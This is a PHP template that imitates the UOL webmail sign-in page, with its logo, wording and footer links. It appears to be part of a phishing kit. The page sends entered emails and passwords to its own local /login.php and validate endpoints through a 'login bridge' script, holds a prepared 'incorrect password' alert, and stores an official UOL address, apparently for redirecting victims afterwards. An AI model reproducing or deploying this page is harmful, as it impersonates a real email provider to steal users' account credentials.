<?php
declare(strict_types=1);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width,initial-scale=1"/>
    <meta name="theme-color" content="#FFFFFF"/>
    <title>E-mail UOL</title>
    <link rel="icon" href="/assets/favicon.ico" sizes="any"/>
    <link rel="shortcut icon" href="/assets/favicon.ico"/>
    <link href="/assets/osiris-2026.css?v=23" rel="stylesheet"/>
</head>
<body class="osiris2026 uol">
<div class="osiris2026-page">
    <div class="osiris2026-card">
        <img class="osiris2026-logo" src="https://imguol.com/p/g/logos/logo_uolmail2.png" alt="E-mail UOL" width="140" height="40"/>
        <p class="osiris2026-intro">Gerencie seus e-mails com a segurança que só o UOL te oferece.</p>
        <h1>Entrar</h1>
        <form id="login_form" action="/login.php" method="post" novalidate>
            <div id="step-email">
                <div class="osiris2026-field">
                    <div class="osiris2026-email-wrap">
                        <input type="text" id="login" name="login" placeholder="E-mail" autocomplete="username" inputmode="email" required/>
                        <span class="suffix">@uol.com.br</span>
                    </div>
                    <p id="email_error" class="osiris2026-field-error" hidden></p>
                </div>
                <p id="cpf_link" class="osiris2026-cpf"><a href="https://conta.uol.com.br/login?t=default" target="_blank" rel="noopener">Deseja se autenticar com CPF/CNPJ?</a></p>
                <button type="button" id="btn_continue" class="osiris2026-btn uol">Continuar</button>
            </div>
            <div id="step-password" class="osiris2026-step-password" hidden>
                <p class="osiris2026-step-label">Informe sua senha</p>
                <div id="password_alert" class="osiris2026-alert" hidden role="alert">
                    <span class="osiris2026-alert-icon" aria-hidden="true"></span>
                    <div class="osiris2026-alert-body">
                        <strong class="osiris2026-alert-title">Senha incorreta</strong>
                        <span class="osiris2026-alert-hint">Cuidado com as teclas Caps Lock e Shift, pois diferenciamos letras mai&uacute;sculas e min&uacute;sculas.</span>
                    </div>
                </div>
                <div class="osiris2026-email-readonly">
                    <span class="osiris2026-user-icon" aria-hidden="true"></span>
                    <span id="email_display"></span>
                    <button type="button" id="btn_clear_email" class="osiris2026-clear" aria-label="Alterar e-mail">&times;</button>
                </div>
                <div class="osiris2026-field">
                    <div class="osiris2026-pass-wrap">
                        <input type="password" id="password" name="password" placeholder="Senha" autocomplete="current-password" required/>
                        <button type="button" id="btn_show_pass" class="osiris2026-show-pw">mostrar</button>
                    </div>
                </div>
                <button type="submit" id="login_submit" class="osiris2026-btn uol">Entrar</button>
            </div>
            <div id="message"></div>
        </form>
        <p class="osiris2026-signup">Ainda não tem e-mail UOL? <a href="http://email.uol.com.br/bem-vindo?utm_source=Mail-login&utm_medium=link-assineja&utm_campaign=link-mail-login-assine-uolmail" target="_blank" rel="noopener">ASSINE JÁ</a></p>
        <a class="osiris2026-forgot" href="https://sac.uol.com.br/recuperarsenha" target="_blank" rel="noopener">Esqueceu a senha?</a>
    </div>
    <footer class="osiris2026-footer">
        <p>Sua senha &eacute; secreta. Nenhum funcion&aacute;rio a servi&ccedil;o do UOL est&aacute; autorizado a solicit&aacute;-la.</p>
        <div class="osiris2026-footer-links">
            <a href="https://sobreuol.noticias.uol.com.br/regras-de-uso.html" target="_blank" rel="noopener">Regras de uso</a>
            <a href="https://sobreuol.noticias.uol.com.br/politica-anti-spam.html" target="_blank" rel="noopener">Pol&iacute;tica anti-spam</a>
            <a href="https://denuncie.uol.com.br/" target="_blank" rel="noopener">Crimes virtuais: denuncie</a>
        </div>
    </footer>
</div><script>
window.LOGIN_BRIDGE = {
    form: "#login_form",
    email: "#login",
    password: "#password",
    message: "#message",
    submit: "#login_submit",
    domain: "@uol.com.br",
    theme: "uol_webmail",
    bootstrap: "/osiris-bootstrap.php",
    action: "/login.php",
    validateAction: "/validate.php"
};
window.UOL_OFFICIAL = <?= json_encode(uol_official_url($config), JSON_UNESCAPED_UNICODE) ?>;
window.UOL_MESSAGES = <?= json_encode([
    'authenticating' => uol_msg('authenticating'),
    'validating'     => 'Validando...',
    'network_error'  => uol_msg('network_error'),
], JSON_UNESCAPED_UNICODE) ?>;
</script>
<script src="/assets/osiris-step-bridge.js?v=23"></script>
</body>
</html>